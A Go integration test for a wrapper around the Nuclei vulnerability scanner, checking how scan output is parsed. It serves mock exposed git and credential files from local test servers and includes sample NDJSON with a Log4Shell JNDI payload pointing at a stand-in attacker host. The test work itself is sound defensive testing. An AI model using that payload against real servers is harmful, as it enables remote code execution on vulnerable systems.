//go:build integration
// +build integration

package scanner

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"testing"
	"time"

	"github.com/Veraticus/prismatic/pkg/logger"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNucleiScanner_Integration(t *testing.T) {
	// Skip if nuclei is not installed
	if _, err := exec.LookPath("nuclei"); err != nil {
		t.Skip("nuclei not installed")
	}

	// Test scanning with simplified approach
	t.Run("Simple Integration Test", func(t *testing.T) {
		// Since Nuclei is primarily for web scanning and takes a long time to load templates,
		// we'll focus on testing our scanner's ability to handle Nuclei's output format

		// Create a minimal web server that Nuclei can scan quickly
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/.git/config" {
				w.WriteHeader(http.StatusOK)
				fmt.Fprintf(w, "[core]\nrepositoryformatversion = 0")
			} else {
				w.WriteHeader(http.StatusOK)
				fmt.Fprintf(w, "OK")
			}
		}))
		defer server.Close()

		// Test our scanner with a very short timeout
		// This will likely timeout, but we can still test the basic functionality
		cfg := Config{
			Timeout: 10, // 10 second timeout
		}

		scanner := NewNucleiScannerWithLogger(cfg, []string{server.URL}, logger.GetGlobalLogger())

		// Run scan with timeout
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		result, err := scanner.Scan(ctx)

		// If context timed out, that's OK - Nuclei takes time to load
		if ctx.Err() != nil {
			t.Skip("Nuclei scan timed out (expected due to template loading)")
			return
		}

		// If we get here, the scan completed
		require.NoError(t, err)
		assert.NotNil(t, result)

		t.Logf("Scanner completed with %d findings", len(result.Findings))
	})

	// Test with web server for completeness
	t.Run("Web Server Scanning", func(t *testing.T) {
		// Create a simple test server
		testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			switch r.URL.Path {
			case "/.git/config":
				// Exposed git config
				fmt.Fprintf(w, `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
[remote "origin"]
	url = https://github.com/example/test-repo.git`)
			case "/config.json":
				// Exposed config with credentials
				w.Header().Set("Content-Type", "application/json")
				fmt.Fprintf(w, `{"api_key":"sk_live_abcd1234","database_password":"admin123"}`)
			default:
				fmt.Fprintf(w, "OK")
			}
		}))
		defer testServer.Close()

		cfg := Config{
			Timeout: 20, // Shorter timeout for web scanning
		}

		scanner := NewNucleiScannerWithLogger(cfg, []string{testServer.URL}, logger.GetGlobalLogger())

		// Run scan with timeout
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		defer cancel()

		result, err := scanner.Scan(ctx)

		// If it times out, skip
		if ctx.Err() != nil {
			t.Skip("Web scanning timed out - nuclei template loading takes too long")
		}

		require.NoError(t, err)
		assert.NotNil(t, result)

		t.Logf("Found %d findings from web scan", len(result.Findings))
	})

	// Test parser with sample output
	t.Run("Parser Test", func(t *testing.T) {
		// Sample Nuclei NDJSON output - updated to use tags as arrays
		sampleOutput := `{"template-id":"apache-detect","info":{"name":"Apache Detection","severity":"info","tags":["tech","apache"]},"type":"http","host":"http://example.com","matched-at":"http://example.com","ip":"93.184.216.34","timestamp":"2024-01-01T12:00:00Z"}
{"template-id":"git-config","info":{"name":"Git Config File","severity":"medium","description":"Git config file exposed","tags":["exposure","git"]},"type":"http","host":"http://example.com","matched-at":"http://example.com/.git/config","ip":"93.184.216.34","timestamp":"2024-01-01T12:00:01Z"}
{"template-id":"CVE-2021-44228","info":{"name":"Apache Log4j RCE","severity":"critical","description":"Apache Log4j2 <=2.14.1 JNDI features used in configuration","reference":"https://nvd.nist.gov/vuln/detail/CVE-2021-44228","tags":["cve","rce","log4j"]},"type":"http","host":"http://example.com","matched-at":"http://example.com/api/v1/users","ip":"93.184.216.34","timestamp":"2024-01-01T12:00:02Z","extracted-results":["${jndi:ldap://attacker.com/a}"]}`

		cfg := Config{}
		scanner := NewNucleiScannerWithLogger(cfg, []string{}, logger.GetGlobalLogger())

		findings, err := scanner.ParseResults([]byte(sampleOutput))
		require.NoError(t, err)
		assert.Len(t, findings, 3)

		// Check technology detection
		assert.Equal(t, "Technology Detection", findings[0].Type)
		assert.Equal(t, "Apache Detection", findings[0].Title)
		assert.Equal(t, "info", findings[0].Severity)

		// Check exposure finding
		assert.Equal(t, "Information Exposure", findings[1].Type)
		assert.Equal(t, "Git Config File", findings[1].Title)
		assert.Equal(t, "medium", findings[1].Severity)
		assert.Contains(t, findings[1].Description, "Git config file exposed")

		// Check CVE finding
		assert.Equal(t, "CVE", findings[2].Type)
		assert.Equal(t, "Apache Log4j RCE", findings[2].Title)
		assert.Equal(t, "critical", findings[2].Severity)
		assert.Contains(t, findings[2].Metadata["extracted"], "jndi:ldap")
		assert.Equal(t, "CVE-2021-44228", findings[2].Metadata["template_id"])
		assert.Contains(t, findings[2].Metadata["tags"], "rce")
	})

	// Test with invalid JSON to ensure error handling
	t.Run("Invalid JSON Handling", func(t *testing.T) {
		cfg := Config{}
		scanner := NewNucleiScannerWithLogger(cfg, []string{}, logger.GetGlobalLogger())

		// Test with invalid JSON - ParseNDJSON silently skips malformed lines
		findings, err := scanner.ParseResults([]byte("invalid json"))
		assert.NoError(t, err) // No error expected, just empty results
		assert.Empty(t, findings)

		// Test with empty input
		findings, err = scanner.ParseResults([]byte(""))
		assert.NoError(t, err)
		assert.Empty(t, findings)

		// Test with partial JSON line - should be silently skipped
		findings, err = scanner.ParseResults([]byte(`{"template-id":"test"`))
		assert.NoError(t, err) // No error expected, just empty results
		assert.Empty(t, findings)

		// Test with mixed valid and invalid lines
		mixedInput := `{"template-id":"valid","info":{"name":"Test","severity":"info"},"type":"http","host":"example.com","matched-at":"example.com","ip":"1.2.3.4","timestamp":"2024-01-01T12:00:00Z"}
invalid line
{"template-id":"valid2","info":{"name":"Test2","severity":"low"},"type":"http","host":"example.com","matched-at":"example.com","ip":"1.2.3.4","timestamp":"2024-01-01T12:00:01Z"}`

		findings, err = scanner.ParseResults([]byte(mixedInput))
		assert.NoError(t, err)
		assert.Len(t, findings, 2) // Should parse the two valid lines
	})
}

// TestNucleiCommandLine tests that nuclei is invoked with correct arguments
func TestNucleiCommandLine(t *testing.T) {
	// This test verifies the command construction without actually running nuclei
	cfg := Config{
		Timeout: 300,
	}

	endpoints := []string{"http://example.com", "https://test.com"}
	scanner := NewNucleiScannerWithLogger(cfg, endpoints, logger.GetGlobalLogger())

	// Use reflection or mock to verify command args
	// For now, just verify the scanner is created correctly
	assert.Equal(t, "nuclei", scanner.Name())
	assert.Equal(t, endpoints, scanner.endpoints)
}
